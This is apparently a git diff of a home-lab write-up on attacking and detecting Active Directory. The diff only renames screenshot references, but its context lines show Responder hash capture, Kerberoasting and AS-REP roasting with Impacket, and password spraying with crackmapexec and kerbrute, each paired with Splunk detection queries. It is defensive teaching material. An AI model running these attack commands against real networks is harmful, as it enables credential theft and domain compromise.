@@ -39,7 +39,7 @@ An attacker listening on the same network can **respond to these broadcasts** (p
 
 The victim machine (`EXBUGZ0D\Administrator`) attempts to access a non-existent UNC path: `\\thisdoesnotexist\share`. DNS cannot resolve this hostname, so Windows falls back to LLMNR/NBT-NS broadcast.
 
-> 📸 **Screenshot:** `1-_Share.png`
+> 📸 **Screenshot:** `1- Share.png`
 
 ```
 C:\Users\Administrator>\\thisdoesnotexist\share
@@ -58,7 +58,7 @@ The attacker runs **Responder** on Kali Linux, which listens on the network and 
 responder -I eth0 -v
 ```
 
-> 📸 **Screenshot:** `2-_Capture.png`
+> 📸 **Screenshot:** `2- Capture.png`
 
 Responder poisoned LLMNR and MDNS responses for the name `thisdoesnotexist`, intercepting authentication from both `192.168.56.101` and `192.168.56.102`. Three NTLMv2 hashes were captured for `EXBUGZ0D\Administrator`.
 
@@ -74,7 +74,7 @@ ls
 cat SMB-NTLMv2-SSP-fe80::65cb:88fc:aa8d:4fe8.txt
 ```
 
-> 📸 **Screenshot:** `3-_Hash.png`
+> 📸 **Screenshot:** `3- Hash.png`
 
 The file contains the full NTLMv2 hash strings for the `Administrator` account, in a format ready for offline cracking.
 
@@ -109,7 +109,7 @@ index=wineventlog (EventCode=4624 OR EventCode=4776) Authentication_Package="NTL
 | table _time host Account_Name src_ip Logon_Type Authentication_Package
 ```
 
-> 📸 **Screenshot:** `5-_Logs_01.png`
+> 📸 **Screenshot:** `5- Logs_01.png`
 
 **17 events** were returned — all from `192.168.56.103`, all Logon Type **3** (network), alternating between `Administrator` and `ANONYMOUS LOGON`. This pairing pattern is characteristic of NTLM capture/relay: the SMB negotiation begins as anonymous, then the actual credential challenge follows.
 
@@ -123,11 +123,11 @@ Sysmon Event ID **22** logs all DNS queries. The failed resolution that triggers
 index=wineventlog EventCode=22
 ```
 
-> 📸 **Screenshot:** `6-_Logs_02.png`
+> 📸 **Screenshot:** `6- Logs_02.png`
 
 654 Sysmon DNS events were found. Drilling into one of them:
 
-> 📸 **Screenshot:** `7-_Logs_03.png`
+> 📸 **Screenshot:** `7- Logs_03.png`
 
 ```
 QueryName:    notFound
@@ -156,7 +156,7 @@ Using Impacket's `GetUserSPNs`, the attacker — already in possession of valid 
 impacket-GetUserSPNs exbugz0d.org/ahmed:'P@ssw0rd' -dc-ip 192.168.56.101 -request
 ```
 
-> 📸 **Screenshot:** `1-_Kerberoasting_Attack.png`
+> 📸 **Screenshot:** `1- Kerberoasting_Attack.png`
 
 | Field | Value |
 |-------|-------|
@@ -180,7 +180,7 @@ index=wineventlog EventCode=4768 Ticket_Encryption_Type=0x17
 | stats count by Account_Name, Service_Name, Client_Address, _time
 ```
 
-> 📸 **Screenshot:** `2-_Kerberoasting_Logs.png`
+> 📸 **Screenshot:** `2- Kerberoasting_Logs.png`
 
 **1 event matched:**
 
@@ -206,7 +206,7 @@ A single RC4 TGS request from an external IP is a strong signal. In production, 
 impacket-GetNPUsers exbugz0d.org/ -usersfile users.txt -dc-ip 192.168.56.101 -no-pass
 ```
 
-> 📸 **Screenshot:** `1-_AS-REP_Attack.png`
+> 📸 **Screenshot:** `1- AS-REP_Attack.png`
 
 | Account | Result |
 |---------|--------|
@@ -231,7 +231,7 @@ index=wineventlog EventCode=4768 Pre_Authentication_Type="-"
 | table _time src_ip Account_Name action
 ```
 
-> 📸 **Screenshot:** `2-_Failures_Logs.png`
+> 📸 **Screenshot:** `2- Failures_Logs.png`
 
 **49 failure events** — all from `::ffff:192.168.56.103`, all within a ~1-second window. Usernames tried: `abulhamed`, `gatada`, `sadeg`, `mohamed`, `dollar`, `noor`, `mazen`, `kola`, `hussam`, `abdullah`, `momen`, `ali`, `root`, and more. The machine-gun timing (millisecond gaps between events) is a definitive indicator of automation.
 
@@ -246,7 +246,7 @@ index=wineventlog EventCode=4768 src_ip="192.168.56.103" action="success"
 | table _time src_ip Account_Name action
 ```
 
-> 📸 **Screenshot:** `3-_Successes_Logs.png`
+> 📸 **Screenshot:** `3- Successes_Logs.png`
 
 **4 success events** for user `ahmed` from `192.168.56.103` — confirming AS-REP hashes were successfully issued. Correlating these successes against the failure burst confirms the full enumeration-to-extraction sequence.
 
@@ -271,7 +271,7 @@ index=wineventlog EventCode=4768 src_ip="192.168.56.103" action="success"
 crackmapexec smb 192.168.56.101 -u users.txt -p 'P@ssw0rd' --continue-on-success
 ```
 
-> 📸 **Screenshot:** `1-_Crackmapexec_Attack.png`
+> 📸 **Screenshot:** `1- Crackmapexec_Attack.png`
 
 | Account | Result |
 |---------|--------|
@@ -319,7 +319,7 @@ index=wineventlog EventCode=4624 Logon_Type=3 src_ip="192.168.56.103"
 | table _time Account_Name action
 ```
 
-> 📸 **Screenshot:** `3-_SMB_Success_Logon.png`
+> 📸 **Screenshot:** `3- SMB_Success_Logon.png`
 
 **2 events at 2026-11-02 19:17:49** — `ANONYMOUS LOGON` (SMB session negotiation) followed immediately by `ahmed` (authenticated session). The timestamp correlation between the spray failures and this success confirms `ahmed` was compromised.
 
@@ -333,7 +333,7 @@ index=wineventlog EventCode=4624 Logon_Type=3 src_ip="192.168.56.103"
 kerbrute passwordspray -d exbugz0d.org --dc 192.168.56.101 users.txt 'P@ssw0rd'
 ```
 
-> 📸 **Screenshot:** `4-_Kerbrute_Attack.png`
+> 📸 **Screenshot:** `4- Kerbrute_Attack.png`
 
 ```
 [+] VALID LOGIN WITH ERROR:   zaytoona@exbugz0d.org:P@ssw0rd   (User's password has expired)
@@ -360,7 +360,7 @@ index=wineventlog EventCode=4768
 | where usernames_tried > 10
 ```
 
-> 📸 **Screenshot:** `5-_Kerb_Logs.png`
+> 📸 **Screenshot:** `5- Kerb_Logs.png`
 
 **1 result:**
 
